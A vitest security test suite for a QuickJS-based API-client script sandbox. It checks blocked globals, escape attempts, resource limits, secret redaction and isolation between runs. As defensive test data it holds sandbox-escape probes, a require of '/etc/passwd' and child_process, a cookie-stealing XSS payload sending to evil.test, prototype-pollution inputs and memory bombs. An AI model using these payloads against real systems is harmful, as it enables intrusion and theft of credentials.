import { describe, expect, it } from 'vitest';
import { runScript } from '@aegis/scripting';
import { expectOk, makeInput, testPhase } from '../unit/helpers/script-input';

/** Runs a script that reports a JSON value through pm.variables and returns it. */
async function probe(expression: string, options: Parameters<typeof makeInput>[1] = {}): Promise<unknown> {
  const r = await runScript(makeInput(`pm.variables.set('probe', JSON.stringify(${expression}));`, options));
  expectOk(r);
  return JSON.parse(r.variables.variables.probe!);
}

// `require` and `Buffer` are deliberately NOT in this list: they are guest-side facades (allow-listed bundled libraries,
// a pure-JS Buffer subset) with no host authority. They are covered by the allow-list test and tests/unit/scripting-libs.test.ts.
const FORBIDDEN_GLOBALS = [
  'process', 'std', 'os', 'fetch', 'XMLHttpRequest', 'WebAssembly', 'module', 'exports', '__dirname', '__filename',
  'global', 'window', 'self', 'document', 'navigator', 'Deno', 'Bun', 'electron', 'ipcRenderer', 'contextBridge', 'Worker', 'WebSocket',
  'setInterval', 'setImmediate', 'clearInterval', 'clearImmediate', 'localStorage', 'sessionStorage', 'indexedDB', 'crypto', 'performance',
  'structuredClone', 'importScripts', 'SharedWorker', 'MessageChannel', 'EventSource', 'Blob', 'FormData', 'Headers', 'Request', 'Response',
  'AbortController', 'print', 'scriptArgs', 'host', '__aegisChai', 'Event', 'EventTarget', 'chai', 'Atomics', 'Intl',
];

describe('sandbox: no ambient authority', () => {
  it('does not expose host/Node/Electron/browser globals', async () => {
    const types = (await probe(`Object.fromEntries(${JSON.stringify(FORBIDDEN_GLOBALS)}.map((n) => [n, typeof globalThis[n]]))`)) as Record<string, string>;
    for (const name of FORBIDDEN_GLOBALS) expect(types[name], name).toBe('undefined');
  });

  it('typeof checks of bare identifiers are undefined', async () => {
    const out = await probe(`[typeof process, typeof std, typeof os, typeof fetch, typeof XMLHttpRequest, typeof WebAssembly, typeof module, typeof crypto, typeof global]`);
    expect(out).toEqual(Array(9).fill('undefined'));
  });

  it('only exposes an allow-list of global names', async () => {
    const names = (await probe(`Object.getOwnPropertyNames(globalThis)`)) as string[];
    const allowed = new Set([
      // ECMAScript intrinsics provided by QuickJS
      'AggregateError', 'Array', 'ArrayBuffer', 'BigInt', 'BigInt64Array', 'BigUint64Array', 'Boolean', 'DataView', 'Date', 'Error', 'EvalError',
      'FinalizationRegistry', 'Float16Array', 'Float32Array', 'Float64Array', 'Function', 'Infinity', 'Int16Array', 'Int32Array', 'Int8Array',
      'InternalError', 'Iterator', 'JSON', 'Map', 'Math', 'NaN', 'Number', 'Object', 'Promise', 'Proxy', 'RangeError', 'ReferenceError', 'Reflect',
      'RegExp', 'Set', 'SharedArrayBuffer', 'String', 'Symbol', 'SyntaxError', 'TypeError', 'URIError', 'Uint16Array', 'Uint32Array', 'Uint8Array',
      'Uint8ClampedArray', 'WeakMap', 'WeakRef', 'WeakSet', 'decodeURI', 'decodeURIComponent', 'encodeURI', 'encodeURIComponent', 'escape', 'eval',
      'globalThis', 'isFinite', 'isNaN', 'parseFloat', 'parseInt', 'undefined', 'unescape',
      // Aegis additions (documented in docs/features/scripting.md)
      'pm', 'postman', 'tests', 'expect', 'console', 'setTimeout', 'clearTimeout', 'queueMicrotask', 'atob', 'btoa', 'TextEncoder', 'TextDecoder',
      'URL', 'URLSearchParams',
      // lazily loaded bundled libraries / guest-side facades (see docs/features/scripting.md "Libraries")
      'require', 'CryptoJS', '_', 'moment', 'tv4', 'xml2Json', 'Buffer',
      // throwing stub for an unsupported library
      'cheerio',
    ]);
    expect(names.filter((n) => !allowed.has(n))).toEqual([]);
  });

  it('loading every library adds no global names beyond the allow-list and nothing host-related', async () => {
    const names = (await probe(`(() => {
      const before = new Set(Object.getOwnPropertyNames(globalThis));
      for (const m of ['lodash', 'moment', 'crypto-js', 'uuid', 'ajv', 'tv4', 'xml2js', 'chai', 'buffer', 'csv-parse/lib/sync']) require(m);
      pm.visualizer.set('<b>{{a}}</b>', { a: 1 });
      return Object.getOwnPropertyNames(globalThis).filter((n) => !before.has(n));
    })()`)) as string[];
    expect(names).toEqual([]);
  });

  it('bundled libraries cannot reach the host bridge or Node (they only receive a getRandomValues shim)', async () => {
    const out = (await probe(`(() => {
      const results = {};
      const _ = require('lodash');
      results.lodashRoot = typeof _.runInContext().VERSION; // lodash's root is the guest global
      results.fnCtor = typeof _.constructor('return typeof host')();
      results.fnCtorProcess = _.constructor('return typeof process')();
      results.ajvNewFunction = (() => { const Ajv = require('ajv'); const v = new Ajv({ strict: false }).compile({ type: 'string' }); return typeof v.constructor('return typeof require')(); })();
      results.hbRequire = (() => { try { pm.visualizer.set('{{lookup this "constructor"}}', {}); return 'rendered'; } catch (e) { return e.name; } })();
      results.momentGlobal = typeof moment.fn.zone;
      return results;
    })()`)) as Record<string, string>;
    expect(out.lodashRoot).toBe('string');
    expect(out.fnCtor).toBe('string');
    expect(out.fnCtorProcess).toBe('undefined');
    expect(out.ajvNewFunction).toBe('string');
    expect(out.hbRequire).toBe('rendered');
  });

  it('constructor / this / Function escapes do not reach the host', async () => {
    const out = (await probe(`(() => {
      const results = {};
      const attempt = (name, fn) => { try { results[name] = String(fn()); } catch (e) { results[name] = 'threw ' + e.name; } };
      attempt('ctorCtor', () => this.constructor.constructor('return typeof process')());
      attempt('ctorCtorFn', () => (function () {}).constructor('return typeof require("child_process")')());
      attempt('thisProcess', () => (function () { return typeof this.process; })());
      attempt('globalProcess', () => typeof (function () { return this; })().process);
      attempt('FunctionRequire', () => typeof Function('return require("fs")')());
      attempt('FunctionGlobal', () => Function('return globalThis')().process === undefined);
      attempt('evalProcess', () => eval('typeof process'));
      attempt('indirectEval', () => (0, eval)('typeof process'));
      attempt('objectCtor', () => ({}).constructor.constructor('return typeof process')());
      attempt('arrayCtor', () => [].constructor.constructor('return typeof process')());
      attempt('promiseCtor', () => Promise.constructor('return typeof process')());
      attempt('asyncFnCtor', () => Object.getPrototypeOf(async function () {}).constructor('return typeof process')().constructor.name);
      attempt('importProcess', () => import('node:process'));
      attempt('proxyHost', () => typeof new Proxy({}, {}).process);
      attempt('callerChain', () => typeof pm.test.caller);
      attempt('argumentsCallee', () => (function () { return typeof arguments.callee; })());
      return results;
    })()`)) as Record<string, string>;
    expect(out.ctorCtor).toBe('undefined');
    expect(out.ctorCtorFn).toMatch(/threw Error/); // the guest require() rejects Node built-ins
    expect(out.thisProcess).toBe('undefined');
    expect(out.globalProcess).toBe('undefined');
    expect(out.FunctionRequire).toMatch(/threw Error/); // require('fs') throws MODULE_NOT_FOUND inside the guest
    expect(out.FunctionGlobal).toBe('true');
    expect(out.evalProcess).toBe('undefined');
    expect(out.indirectEval).toBe('undefined');
    expect(out.objectCtor).toBe('undefined');
    expect(out.arrayCtor).toBe('undefined');
    for (const key of ['importProcess']) expect(out[key], key).toMatch(/threw|Promise|undefined/);
    expect(JSON.stringify(out)).not.toMatch(/\bobject\b.*process/);
    // None of the probes may have produced a value that looks like a Node object.
    expect(JSON.stringify(out)).not.toContain('[object process]');
  });

  it('dynamic import() cannot load host modules', async () => {
    const r = await runScript(makeInput(`const m = await import('node:fs'); pm.variables.set('loaded', typeof m.readFileSync);`));
    expect(r.variables.variables.loaded).toBeUndefined();
    expect(r.ok).toBe(false);
  });

  it('require() of Node built-ins and unknown modules throws (no file system, processes or network)', async () => {
    const r = await runScript(makeInput(`require('fs');`));
    expect(r.ok).toBe(false);
    expect(r.error?.name).toBe('Error');
    expect(r.error?.message).toContain("Cannot find module 'fs'");

    const probe = await runScript(
      makeInput(`
        const out = {};
        for (const m of ['fs', 'child_process', 'node:fs', 'net', 'http', 'https', 'os', 'path', 'util', 'vm', 'worker_threads', 'electron', 'crypto', 'node:crypto', 'cheerio', 'postman-collection', '../package.json', './x', '/etc/passwd', 'lodash/fp']) {
          try { require(m); out[m] = 'loaded'; } catch (e) { out[m] = e.code || e.name; }
        }
        pm.variables.set('out', JSON.stringify(out));
      `),
    );
    expectOk(probe);
    const out = JSON.parse(probe.variables.variables.out!) as Record<string, string>;
    for (const [name, value] of Object.entries(out)) expect(value, name).toMatch(/^(MODULE_NOT_FOUND|Error)$/);
  });

  it('pm.visualizer output is stripped of scripts, handlers and javascript: URLs before it leaves the sandbox', async () => {
    const r = await runScript(
      makeInput(
        `pm.visualizer.set('<div onclick="steal()">{{{raw}}}<a href="javascript:alert(1)">x</a><img src=x onerror=alert(1)></div>', { raw: '<script>fetch("https://evil.test?" + document.cookie)</script><iframe src="https://evil.test"></iframe><p>ok</p>' });`,
        { secretValues: ['sk_live_9f8e7d6c5b4a'] },
      ),
    );
    expectOk(r);
    const html = r.visualizer!;
    expect(html).not.toMatch(/<script|<iframe|onclick|onerror|javascript:/i);
    expect(html).toContain('<p>ok</p>');
  });

  it('pm.visualizer rejects templates and output larger than 2 MiB', async () => {
    const r = await runScript(
      makeInput(`
        try { pm.visualizer.set('x'.repeat(2 * 1024 * 1024 + 1)); } catch (e) { pm.variables.set('tpl', e.name); }
        try { pm.visualizer.set('{{{big}}}', { big: 'y'.repeat(2 * 1024 * 1024 + 1) }); } catch (e) { pm.variables.set('out', e.name); }
      `),
    );
    expectOk(r);
    expect(r.variables.variables).toEqual({ tpl: 'RangeError', out: 'RangeError' });
    expect(r.visualizer).toBeUndefined();
  });

  it('cookie jar writes cannot set httpOnly cookies and operations are capped', async () => {
    const ops: unknown[] = [];
    const host = {
      sendRequest: async () => {
        throw new Error('unused');
      },
      cookieJar: async (op: unknown) => {
        ops.push(op);
        return { cookies: [] };
      },
    };
    const r = await runScript(
      makeInput(
        `
        const jar = pm.cookies.jar();
        try { await jar.set('https://a.test', { name: 'sid', value: '1', httpOnly: true }); pm.variables.set('httpOnly', 'accepted'); } catch (e) { pm.variables.set('httpOnly', e.message); }
        let rejected = 0;
        for (let i = 0; i < 205; i++) { try { await jar.set('https://a.test', 'c' + i, 'v'); } catch (e) { rejected++; } }
        pm.variables.set('rejected', String(rejected));
        `,
        { host },
      ),
    );
    expectOk(r);
    expect(r.variables.variables.httpOnly).toContain('httpOnly');
    expect(ops).toHaveLength(200);
    expect(r.variables.variables.rejected).toBe('5');
    expect(JSON.stringify(ops)).not.toContain('httpOnly":true');
  });

  it('internal prelude objects and host bindings are not reachable from user code', async () => {
    const out = await probe(`({ host: typeof host, chai: typeof __aegisChai, input: typeof inputJson, stubEnv: Object.keys(pm).filter((k) => /host|bridge|native/i.test(k)) })`);
    expect(out).toEqual({ host: 'undefined', chai: 'undefined', input: 'undefined', stubEnv: [] });
  });

  it('cannot read the secrets list or other input fields beyond the documented API', async () => {
    const r = await runScript(
      makeInput(`pm.variables.set('dump', JSON.stringify([Object.keys(pm), pm.info]));`, { secretValues: ['TOP-SECRET-VALUE-123'] }),
    );
    expectOk(r);
    expect(r.variables.variables.dump).not.toContain('TOP-SECRET-VALUE-123');
  });
});

describe('sandbox: resource limits', () => {
  it('infinite loop => SCRIPT_TIMEOUT within about timeout + 500 ms', async () => {
    const started = Date.now();
    const r = await runScript(makeInput(`pm.environment.set('before', '1'); while (true) {}`, { limits: { timeoutMs: 400 } }));
    const elapsed = Date.now() - started;
    expect(r.ok).toBe(false);
    expect(r.error?.code).toBe('SCRIPT_TIMEOUT');
    expect(elapsed).toBeLessThan(400 + 500 + 400); // + generous scheduling slack for CI
    expect(r.variables.environment.before).toBe('1');
    expect(r.durationMs).toBeGreaterThanOrEqual(350);
  });

  it('cannot swallow the interrupt with try/catch/finally', async () => {
    const r = await runScript(makeInput(`try { while (true) {} } catch (e) { while (true) {} } finally { while (true) {} }`, { limits: { timeoutMs: 300 } }));
    expect(r.error?.code).toBe('SCRIPT_TIMEOUT');
  });

  it('timeouts apply to code running after an await, in timers and in promise chains', async () => {
    const afterAwait = await runScript(makeInput(`await Promise.resolve(); while (true) {}`, { limits: { timeoutMs: 300 } }));
    expect(afterAwait.error?.code).toBe('SCRIPT_TIMEOUT');

    const inTimer = await runScript(makeInput(`setTimeout(() => { for (;;) {} }, 10);`, { limits: { timeoutMs: 300 } }));
    expect(inTimer.error?.code).toBe('SCRIPT_TIMEOUT');

    const microtasks = await runScript(makeInput(`const f = () => Promise.resolve().then(f); f();`, { limits: { timeoutMs: 300 } }));
    expect(microtasks.error?.code).toBe('SCRIPT_TIMEOUT');

    const timerStorm = await runScript(makeInput(`const f = () => setTimeout(f, 0); f();`, { limits: { timeoutMs: 300 } }));
    expect(timerStorm.error?.code).toBe('SCRIPT_TIMEOUT');
  });

  it('catastrophic regex backtracking is interrupted', async () => {
    const started = Date.now();
    const r = await runScript(makeInput(`/(a+)+$/.test('a'.repeat(60) + 'b');`, { limits: { timeoutMs: 400 } }));
    expect(r.error?.code).toBe('SCRIPT_TIMEOUT');
    expect(Date.now() - started).toBeLessThan(2500);
  });

  it('a long wait that is not CPU-bound still honours the deadline and clears its timers', async () => {
    const before = process.getActiveResourcesInfo().filter((x) => x === 'Timeout').length;
    const started = Date.now();
    const r = await runScript(makeInput(`setTimeout(() => {}, 60000); await new Promise((res) => setTimeout(res, 60000));`, { limits: { timeoutMs: 300 } }));
    expect(r.error?.code).toBe('SCRIPT_TIMEOUT');
    expect(Date.now() - started).toBeLessThan(1500);
    const after = process.getActiveResourcesInfo().filter((x) => x === 'Timeout').length;
    expect(after).toBeLessThanOrEqual(before);
  });

  it('memory bomb (array of arrays) => SCRIPT_MEMORY (or timeout), never hangs or crashes the host', async () => {
    const started = Date.now();
    const r = await runScript(makeInput(`const a = []; while (1) a.push(new Array(1e6));`, { limits: { memoryLimitBytes: 16 * 1024 * 1024, timeoutMs: 2000 } }));
    expect(r.ok).toBe(false);
    expect(['SCRIPT_MEMORY', 'SCRIPT_TIMEOUT']).toContain(r.error?.code);
    expect(Date.now() - started).toBeLessThan(5000);
    // the host (and the shared WASM module) is still healthy afterwards
    const next = await runScript(makeInput(`pm.variables.set('alive', 'yes')`));
    expect(next.variables.variables.alive).toBe('yes');
  });

  it('string doubling bomb => SCRIPT_MEMORY', async () => {
    const r = await runScript(makeInput(`let s = 'x'; while (true) s += s;`, { limits: { memoryLimitBytes: 8 * 1024 * 1024, timeoutMs: 3000 } }));
    expect(r.ok).toBe(false);
    expect(['SCRIPT_MEMORY', 'SCRIPT_ERROR', 'SCRIPT_TIMEOUT']).toContain(r.error?.code);
    expect(r.error?.code).not.toBe('SCRIPT_TIMEOUT');
  });

  it('out-of-memory that the script catches itself keeps the budget enforced', async () => {
    const r = await runScript(
      makeInput(`const a = []; let n = 0; try { while (true) { a.push(new Array(1e5)); n++; } } catch (e) { pm.variables.set('caught', e.name + ':' + e.message); }`, {
        limits: { memoryLimitBytes: 8 * 1024 * 1024 },
      }),
    );
    expect(r.variables.variables.caught).toBe('InternalError:out of memory');
  });

  it('time and memory limits still hold with libraries loaded', async () => {
    const cpu = await runScript(
      makeInput(`const _ = require('lodash'); const m = require('moment'); CryptoJS.SHA256('x'); pm.environment.set('loaded', '1'); while (true) { _.range(10); m(); }`, {
        limits: { timeoutMs: 400 },
      }),
    );
    expect(cpu.error?.code).toBe('SCRIPT_TIMEOUT');
    expect(cpu.variables.environment.loaded).toBe('1');

    const memory = await runScript(
      makeInput(`const _ = require('lodash'); require('ajv'); require('moment'); const a = []; while (true) a.push(_.range(1e5));`, {
        limits: { memoryLimitBytes: 24 * 1024 * 1024, timeoutMs: 3000 },
      }),
    );
    expect(memory.ok).toBe(false);
    expect(['SCRIPT_MEMORY', 'SCRIPT_TIMEOUT']).toContain(memory.error?.code);

    const hashBomb = await runScript(makeInput(`let s = 'x'; while (true) s += CryptoJS.SHA512(s).toString();`, { limits: { memoryLimitBytes: 8 * 1024 * 1024, timeoutMs: 3000 } }));
    expect(hashBomb.ok).toBe(false);
    expect(['SCRIPT_MEMORY', 'SCRIPT_TIMEOUT']).toContain(hashBomb.error?.code);

    const tooSmall = await runScript(makeInput(`try { require('lodash'); pm.variables.set('r', 'loaded'); } catch (e) { pm.variables.set('r', e.name + ':' + e.message); }`, { limits: { memoryLimitBytes: 256 * 1024 } }));
    expect(tooSmall.variables.variables.r ?? tooSmall.error?.code).toMatch(/could not be loaded|out of memory|SCRIPT_MEMORY|loaded/);

    const next = await runScript(makeInput(`pm.variables.set('alive', require('lodash').VERSION)`));
    expectOk(next);
    expect(next.variables.variables.alive).toMatch(/^4\./);
  });

  it('deep recursion => SCRIPT_ERROR (stack overflow), not a host crash', async () => {
    const r = await runScript(makeInput(`function f() { return f() + 1; } f();`));
    expect(r.ok).toBe(false);
    expect(r.error?.code).toBe('SCRIPT_ERROR');
    expect(r.error?.message).toMatch(/stack/i);
    const next = await runScript(makeInput(`pm.variables.set('alive', 'yes')`));
    expect(next.variables.variables.alive).toBe('yes');
  });

  it('mutual / async / getter recursion is also contained', async () => {
    const cases = [
      `function a() { return b(); } function b() { return a(); } a();`,
      `const o = { get x() { return this.x; } }; o.x;`,
      `const p = new Proxy({}, { get(t, k, r) { return r[k]; } }); p.x;`,
      `function f() { return [1].map(f); } f();`,
      `const o = { toString() { return '' + this; } }; '' + o;`,
    ];
    for (const source of cases) {
      const r = await runScript(makeInput(source));
      expect(r.ok, source).toBe(false);
      expect(r.error?.code, source).toBe('SCRIPT_ERROR');
    }
  });

  it('a script that overflows the NATIVE stack (deeply nested data) fails cleanly and the sandbox recovers', async () => {
    const r = await runScript(makeInput(`const o = {}; let c = o; for (let i = 0; i < 200000; i++) { c.a = {}; c = c.a; } JSON.stringify(o);`));
    expect(r.ok).toBe(false);
    expect(r.error?.code).toBe('SCRIPT_ERROR');
    for (let i = 0; i < 2; i++) {
      const next = await runScript(makeInput(`pm.test('works', () => pm.expect(1).to.equal(1)); pm.variables.set('alive', 'yes')`));
      expectOk(next);
      expect(next.variables.variables.alive).toBe('yes');
      expect(next.tests[0]?.passed).toBe(true);
    }
  });

  it('a native stack overflow inside a timer callback is contained (no uncaught host exception)', async () => {
    const uncaught: unknown[] = [];
    const onUncaught = (e: unknown): void => {
      uncaught.push(e);
    };
    process.on('uncaughtException', onUncaught);
    try {
      const r = await runScript(
        makeInput(`setTimeout(() => { const o = {}; let c = o; for (let i = 0; i < 200000; i++) { c.a = {}; c = c.a; } JSON.stringify(o); }, 10);`),
      );
      expect(r.ok).toBe(false);
      expect(r.error?.code).toBe('SCRIPT_ERROR');
      await new Promise((res) => setTimeout(res, 50));
      expect(uncaught).toEqual([]);
      const next = await runScript(makeInput(`pm.variables.set('alive', 'yes')`));
      expect(next.variables.variables.alive).toBe('yes');
    } finally {
      process.off('uncaughtException', onUncaught);
    }
  });

  it('rejects absurd source size and nesting before parsing', async () => {
    const nested = await runScript(makeInput('('.repeat(5000) + '1' + ')'.repeat(5000)));
    expect(nested.ok).toBe(false);
    expect(nested.error?.message).toContain('nested too deeply');
    const huge = await runScript(makeInput('// ' + 'x'.repeat(3 * 1024 * 1024)));
    expect(huge.ok).toBe(false);
    expect(huge.error?.message).toContain('too large');
  });

  it('moderately nested code at the allowed limit still works', async () => {
    const r = await runScript(makeInput(`pm.variables.set('v', String(${'('.repeat(100)}1${')'.repeat(100)}))`));
    expectOk(r);
    expect(r.variables.variables.v).toBe('1');
  });

  it('console output is capped (entries and size) and flagged as truncated', async () => {
    const entries = await runScript(makeInput(`for (let i = 0; i < 5000; i++) console.log('line ' + i);`));
    expectOk(entries);
    expect(entries.console).toHaveLength(1000);
    expect(entries.console[0]!.message).toBe('line 0');
    expect(entries.console[998]!.message).toBe('line 998');
    expect(entries.console[999]).toMatchObject({ level: 'warn' });
    expect(entries.console[999]!.message).toContain('truncated');

    const big = await runScript(makeInput(`console.log('A'.repeat(1_000_000)); console.log({ big: 'B'.repeat(200000) });`));
    expectOk(big);
    for (const c of big.console) expect(c.message.length).toBeLessThanOrEqual(16 * 1024);
    expect(big.console[0]!.message.endsWith('[truncated]')).toBe(true);
  });

  it('huge number of tests is capped', async () => {
    const r = await runScript(makeInput(`for (let i = 0; i < 6000; i++) pm.test('t' + i, () => {});`));
    expectOk(r);
    expect(r.tests.length).toBeLessThanOrEqual(5000);
  });
});

describe('sandbox: secrets', () => {
  const SECRET = 'sk_live_9f8e7d6c5b4a';

  it('redacts secret values in console output, even when logged as part of an object', async () => {
    const r = await runScript(
      makeInput(`console.log('token is ${SECRET}'); console.error({ nested: { key: '${SECRET}' } }); console.warn('%s', '${SECRET}');`, { secretValues: [SECRET] }),
    );
    expectOk(r);
    expect(JSON.stringify(r.console)).not.toContain(SECRET);
    expect(r.console[0]!.message).toBe('token is [REDACTED]');
  });

  it('redacts secrets in secret-looking output patterns even if not registered', async () => {
    const r = await runScript(makeInput(`console.log('Authorization: Bearer abcdefghijklmnop'); console.log('password=hunter2hunter2');`));
    expectOk(r);
    expect(r.console.map((c) => c.message).join('\n')).not.toMatch(/abcdefghijklmnop|hunter2/);
  });

  it('redacts secrets that straddle the console message truncation boundary', async () => {
    const r = await runScript(makeInput(`console.log('x'.repeat(16380) + '${SECRET}' + 'y'.repeat(100));`, { secretValues: [SECRET] }));
    expectOk(r);
    const msg = r.console[0]!.message;
    expect(msg).not.toContain(SECRET);
    expect(msg).not.toContain('sk_live');
    expect(msg.length).toBeLessThanOrEqual(16 * 1024);
  });

  it('redacts secrets in error message, name, stack and test results', async () => {
    const r = await runScript(
      makeInput(
        `
        pm.test('uses ${SECRET}', () => { throw new Error('failed with ${SECRET}'); });
        function leak() { throw new Error('boom ${SECRET}'); }
        leak();
        `,
        { secretValues: [SECRET] },
      ),
    );
    expect(r.ok).toBe(false);
    expect(JSON.stringify(r)).not.toContain(SECRET);
    expect(r.error?.message).toBe('boom [REDACTED]');
    expect(r.tests[0]!.name).toBe('uses [REDACTED]');
    expect(r.tests[0]!.error).toBe('Error: failed with [REDACTED]');
  });

  it('redacts secrets in syntax-error messages', async () => {
    const r = await runScript(makeInput(`var ${SECRET} = ;`, { secretValues: [SECRET] }));
    expect(r.ok).toBe(false);
    expect(JSON.stringify(r)).not.toContain(SECRET);
  });
});

describe('sandbox: isolation from the host and between runs', () => {
  it('prototype pollution inside the guest has no effect on host objects', async () => {
    const hostObjectBefore = {} as Record<string, unknown>;
    const r = await runScript(
      makeInput(`
        Object.prototype.polluted = 'yes';
        Array.prototype.polluted = 'yes';
        ({}).__proto__.polluted2 = 'yes';
        Object.prototype.__defineGetter__ && Object.prototype.__defineGetter__('evil', () => 'evil');
        JSON.parse('{"__proto__": {"polluted3": "yes"}}');
        pm.environment.set('__proto__', 'x');
        pm.environment.set('constructor', 'y');
        pm.environment.set('toString', 'z');
        pm.globals.set('hasOwnProperty', 'h');
      `),
    );
    expectOk(r);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(([] as unknown as Record<string, unknown>).polluted).toBeUndefined();
    expect(hostObjectBefore.polluted2).toBeUndefined();
    expect((Object.prototype as Record<string, unknown>).evil).toBeUndefined();
    expect(Object.getPrototypeOf(r.variables.environment)).toBe(Object.prototype);
    expect(Object.hasOwn(r.variables.environment, '__proto__')).toBe(true);
    expect((r.variables.environment as Record<string, unknown>).polluted).toBeUndefined();
    expect(r.variables.environment.toString).toBe('z');
    expect(r.variables.globals.hasOwnProperty).toBe('h');
    expect(r.changes.environment.set.constructor).toBe('y');
  });

  it('hostile input state (including __proto__ keys) does not pollute either side', async () => {
    const hostile = JSON.parse('{"__proto__": "p", "ok": "1"}') as Record<string, string>;
    const r = await runScript(
      makeInput(`pm.variables.set('seen', JSON.stringify(Object.keys(pm.environment.toObject())));`, { variables: { environment: hostile } }),
    );
    expectOk(r);
    expect(JSON.parse(r.variables.variables.seen!)).toEqual(['__proto__', 'ok']);
    expect(({} as Record<string, unknown>).p).toBeUndefined();
  });

  it('globals, prototypes and timers do not leak into the next run', async () => {
    await runScript(
      makeInput(`
        globalThis.leaked = 'secret-state';
        Object.prototype.leakedProto = 1;
        Array.prototype.map = function () { return 'hijacked'; };
        JSON.stringify = () => 'hijacked';
        pm.environment.set('first', '1');
        setTimeout(() => { globalThis.fromTimer = 1; }, 50);
      `),
    );
    const next = await runScript(
      makeInput(`pm.variables.set('state', JSON.stringify({ leaked: typeof leaked, proto: ({}).leakedProto, map: [1].map((x) => x + 1), stringify: JSON.stringify({ a: 1 }), env: pm.environment.toObject(), timer: typeof fromTimer }));`),
    );
    expectOk(next);
    expect(JSON.parse(next.variables.variables.state!)).toEqual({ leaked: 'undefined', map: [2], stringify: '{"a":1}', env: {}, timer: 'undefined' });
  });

  it('tampering with JSON.stringify/Map/Array built-ins cannot corrupt or hang result collection', async () => {
    const r = await runScript(
      makeInput(`
        pm.environment.set('a', '1');
        JSON.stringify = function () { while (true) {} };
        JSON.parse = function () { throw new Error('nope'); };
        Object.keys = function () { return []; };
        Array.prototype.map = function () { while (true) {} };
        Map.prototype.set = function () {};
        pm.test('t', () => {});
      `),
    );
    // Either the run reports the real state or fails safely; it must come back quickly and never throw.
    expect(typeof r.ok).toBe('boolean');
    if (r.ok) expect(r.variables.environment.a).toBe('1');
  });

  it('tampering that makes results unreadable is reported as an error within the grace period', async () => {
    const started = Date.now();
    const r = await runScript(
      makeInput(`
        pm.environment.set('a', '1');
        Map.prototype[Symbol.iterator] = function () { while (true) {} };
      `),
    );
    expect(Date.now() - started).toBeLessThan(4000);
    expect(r.ok).toBe(false);
    expect(r.error?.code).toBe('SCRIPT_ERROR');
  });

  it('forged result objects cannot inject unexpected shapes into the result', async () => {
    const r = await runScript(
      makeInput(`
        pm.environment.set('a', '1');
        pm.request.method = { evil: true };
        pm.request.url = { toString() { return 42; } };
        pm.request.body.mode = 'definitely-not-a-mode';
        pm.request.headers.add({ key: 'X', value: { toString() { throw new Error('x'); } } });
      `),
    );
    // Whatever happens, the contract's shapes hold.
    expect(typeof r.request.method).toBe('string');
    expect(typeof r.request.url).toBe('string');
    expect(['none', 'raw', 'urlencoded', 'formdata', 'binary']).toContain(r.request.body.mode);
    expect(Array.isArray(r.request.headers)).toBe(true);
    for (const h of r.request.headers) expect(typeof h.value).toBe('string');
  });

  it('scripts see only the data they were given: other runs and unrelated state are invisible', async () => {
    const [a, b] = await Promise.all([
      runScript(makeInput(`await new Promise((r) => setTimeout(r, 30)); pm.variables.set('who', pm.environment.get('me'));`, { variables: { environment: { me: 'A' } } })),
      runScript(makeInput(`await new Promise((r) => setTimeout(r, 10)); pm.variables.set('who', pm.environment.get('me'));`, { variables: { environment: { me: 'B' } } })),
    ]);
    expect(a.variables.variables.who).toBe('A');
    expect(b.variables.variables.who).toBe('B');
  });
});

describe('sandbox: cancellation', () => {
  it('an already-aborted signal does not start the script', async () => {
    const controller = new AbortController();
    controller.abort();
    const r = await runScript(makeInput(`pm.environment.set('ran', '1')`, { signal: controller.signal }));
    expect(r.ok).toBe(false);
    expect(r.error).toMatchObject({ code: 'SCRIPT_ERROR', message: 'Script cancelled' });
    expect(r.variables.environment.ran).toBeUndefined();
  });

  it('abort stops a CPU-bound script promptly (checked at interpreter interrupt points)', async () => {
    // A synchronous script blocks the event loop, so a real AbortController could not fire while it runs.
    // The sandbox polls `signal.aborted` from the interrupt handler; model a cancellation that lands mid-run.
    const abortAt = Date.now() + 150;
    const signal = {
      get aborted() {
        return Date.now() >= abortAt;
      },
      addEventListener() {},
      removeEventListener() {},
    } as unknown as AbortSignal;
    const started = Date.now();
    const r = await runScript(makeInput(`pm.environment.set('x', '1'); while (true) {}`, { signal, limits: { timeoutMs: 20_000 } }));
    expect(r.error).toMatchObject({ code: 'SCRIPT_ERROR', message: 'Script cancelled' });
    expect(Date.now() - started).toBeLessThan(2500);
    expect(r.variables.environment.x).toBe('1');
  });

  it('abort stops a script that is waiting on timers', async () => {
    const controller = new AbortController();
    const promise = runScript(makeInput(`await new Promise((r) => setTimeout(r, 30000));`, { signal: controller.signal, limits: { timeoutMs: 60_000 } }));
    setTimeout(() => controller.abort(), 100);
    const started = Date.now();
    const r = await promise;
    expect(r.error?.message).toBe('Script cancelled');
    expect(Date.now() - started).toBeLessThan(2000);
  });
});

describe('sandbox: response data is inert', () => {
  it('a malicious response body is only ever data', async () => {
    const r = await runScript(
      testPhase(`pm.variables.set('t', typeof pm.response.text()); pm.test('json', () => pm.expect(pm.response.json()).to.have.property('__proto__'));`, {
        response: { code: 200, status: 'OK', headers: [], bodyText: '{"__proto__": {"polluted": true}, "constructor": "x"}', responseTimeMs: 1, responseSizeBytes: 10, cookies: [] },
      }),
    );
    expectOk(r);
    expect(({} as Record<string, unknown>).polluted).toBeUndefined();
    expect(r.variables.variables.t).toBe('string');
  });
});
